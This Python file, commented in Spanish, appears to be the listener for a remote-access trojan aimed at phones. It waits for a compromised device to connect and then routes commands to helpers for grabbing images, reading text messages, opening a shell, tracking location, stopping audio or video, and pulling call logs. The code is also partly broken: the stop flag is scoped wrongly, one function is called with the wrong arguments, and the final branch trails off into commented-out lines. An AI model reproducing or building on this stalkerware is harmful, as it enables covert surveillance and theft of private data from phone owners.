#Iimports
import socket
import threading
from utils import *

def animate(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+Style.BRIGHT+Fore.GREEN+message+c+Fore.RESET, end="")
        time.sleep(0.1)

def shell(ip, port):
    #se instancia la conexion
    soc = socket.socket() 
    # Crea a TCP/IP socket
    soc = socket.socket(type=socket.SOCK_STREAM)
    #se utiliza para asociar el conector con la dirección del servidor
    soc.bind((ip, port))
    #Escucha las conexiones entrantes
    soc.listen(2)

    
    while True:
        done=False
        # Creamos un subproceso usando hilos
        t = threading.Thread(target=animate,args=(" Waiting for Connections ",))
        # Una vez que se termina el subproceso inicia 
        t.start()
        # Acepta la conexion y recupera una variable de conexion y la direccion
        conn, addr = soc.accept()
        done = True
        t.join()
        clear()
        #print(Fore.YELLOW+"Got connection from "+Fore.RED+"".join(str(addr))+Fore.RESET)
        #print(" ")
        while True:
            #Se recibe el mensaje, se lo pone limite de tamaño  
            msg = conn.recv(4024).decode("UTF-8")
            if(msg.strip() == "IMAGE"):
                getImage(conn)
            elif("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn,data)
            elif(msg.strip() == "SHELL"):
                shell(conn)
            elif(msg.strip() == "getLocation"):
                getLocation(conn)
            elif(msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif(msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif(msg.strip() == "callLogs"):
                callLogs(conn)
            elif(msg.strip() == "help"):
                help()
            else:
                #print(msg)
            #message_to_send = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
            #conn.send(message_to_send.encode("UTF-8"))
            #if message_to_send.strip() == "exit":
                #print(" ")
                #print("Bye")
                #sys.exit()
            #if(message_to_send.strip() == "clear"):
                #clear()
                clear()